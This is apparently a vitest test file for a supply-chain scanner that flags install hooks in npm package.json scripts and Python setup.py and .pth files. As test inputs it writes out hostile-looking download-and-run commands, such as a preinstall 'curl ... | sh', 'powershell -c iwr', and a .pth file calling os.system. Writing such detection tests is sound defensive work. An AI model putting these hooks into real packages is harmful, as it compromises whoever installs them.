import { mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import * as path from 'node:path';
import { describe, expect, it } from 'vitest';
import type { ResolvedDep } from '../../../src/core/types';
import { scanInstallHooks } from '../../../src/scanners/installHooks';

const npmDep: ResolvedDep = {
  ecosystem: 'npm',
  name: 'pkg',
  version: '1.0.0',
  installPath: '/pkg',
  direct: true,
  isDev: false,
};
const pyDep: ResolvedDep = { ...npmDep, ecosystem: 'pypi', installPath: '/site' };

function reader(files: Record<string, string>) {
  return async (f: string) => {
    const text = files[f];
    if (text === undefined) throw new Error('missing');
    return text;
  };
}

async function npmHooks(scripts: Record<string, string>) {
  const text = JSON.stringify({ name: 'pkg', scripts }, null, 2);
  return scanInstallHooks(npmDep, ['/pkg/package.json'], reader({ '/pkg/package.json': text }));
}

describe('npm lifecycle scripts', () => {
  it('reports install scripts with their location', async () => {
    const [f] = await npmHooks({ postinstall: 'node-gyp rebuild', test: 'jest' });
    expect(f).toMatchObject({
      ruleId: 'install-hook/npm-lifecycle-script',
      category: 'install-hook',
      source: 'install-hook',
      severity: 'medium',
      message: 'pkg runs "postinstall": node-gyp rebuild',
      location: { file: '/pkg/package.json', range: { startLine: 3 } },
    });
  });

  it('escalates download-and-run scripts to critical', async () => {
    for (const script of [
      'curl https://x.example.invalid/a.sh | sh',
      'node -e "require(1)"',
      'powershell -c iwr x',
    ]) {
      const [f] = await npmHooks({ preinstall: script });
      expect(f?.severity, script).toBe('critical');
      expect(f?.title).toBe('Install script downloads or runs code');
    }
  });

  it('treats prepare as low and ignores non-lifecycle scripts', async () => {
    const findings = await npmHooks({ prepare: 'tsc', build: 'curl x | sh' });
    expect(findings.map((f) => f.severity)).toEqual(['low']);
  });

  it('only reads the package root manifest', async () => {
    const files = { '/pkg/sub/package.json': '{"scripts":{"install":"x"}}' };
    expect(await scanInstallHooks(npmDep, Object.keys(files), reader(files))).toEqual([]);
    expect(await scanInstallHooks(npmDep, ['/pkg/package.json'], reader({}))).toEqual([]);
    const broken = { '/pkg/package.json': '' };
    expect(await scanInstallHooks(npmDep, Object.keys(broken), reader(broken))).toEqual([]);
  });

  it('reports native builds from binding.gyp when there is no install script', async () => {
    const dir = await mkdtemp(path.join(tmpdir(), 'depthreat-gyp-'));
    await writeFile(path.join(dir, 'binding.gyp'), '{}');
    await writeFile(path.join(dir, 'package.json'), '{"name":"pkg"}');
    const findings = await scanInstallHooks({ ...npmDep, installPath: dir }, [
      path.join(dir, 'package.json'),
    ]);
    expect(findings.map((f) => [f.ruleId, f.severity])).toEqual([
      ['install-hook/npm-native-build', 'low'],
    ]);
  });

  it('analyzes the npm-sample fixture', async () => {
    const root = path.resolve(__dirname, '../../fixtures/npm-sample/node_modules/evil-postinstall');
    const [f] = await scanInstallHooks({ ...npmDep, installPath: root }, [
      path.join(root, 'package.json'),
    ]);
    expect(f).toMatchObject({
      severity: 'medium',
      message: 'pkg runs "postinstall": node install.js',
    });
  });
});

describe('python install hooks', () => {
  async function py(files: Record<string, string>) {
    return scanInstallHooks(pyDep, Object.keys(files), reader(files));
  }

  it('flags setup.py that runs commands or network code', async () => {
    const [f] = await py({
      '/site/pkg/setup.py':
        "# os.system('no')\nfrom setuptools import setup\nos.system('curl x')\nsetup()",
    });
    expect(f).toMatchObject({
      ruleId: 'install-hook/python-setup-exec',
      severity: 'high',
      location: { range: { startLine: 2, startCol: 0 } },
    });
  });

  it('rates custom install commands as medium and plain setup.py as clean', async () => {
    const [f] = await py({ '/site/setup.py': 'setup(cmdclass={"install": Custom})' });
    expect(f?.severity).toBe('medium');
    expect(await py({ '/site/setup.py': 'from setuptools import setup\nsetup()' })).toEqual([]);
  });

  it('rates .pth files by what they import', async () => {
    const sev = async (name: string, text: string) =>
      (await py({ [`/site/${name}`]: text }))[0]?.severity;
    expect(await sev('evil.pth', "import os; os.system('id')")).toBe('critical');
    expect(await sev('odd.pth', 'import mymodule')).toBe('high');
    expect(await sev('distutils-precedence.pth', "import os; var = 'SETUPTOOLS'")).toBe('low');
    expect(await sev('__editable__.pkg-1.0.pth', 'import __editable___pkg_finder')).toBe('low');
    expect(await sev('paths.pth', '/opt/lib\n../other')).toBeUndefined();
  });

  it('ignores npm-only files for python packages and vice versa', async () => {
    expect(await py({ '/site/package.json': '{"scripts":{"install":"x"}}' })).toEqual([]);
    const files = { '/pkg/setup.py': 'os.system(1)' };
    expect(await scanInstallHooks(npmDep, Object.keys(files), reader(files))).toEqual([]);
  });
});
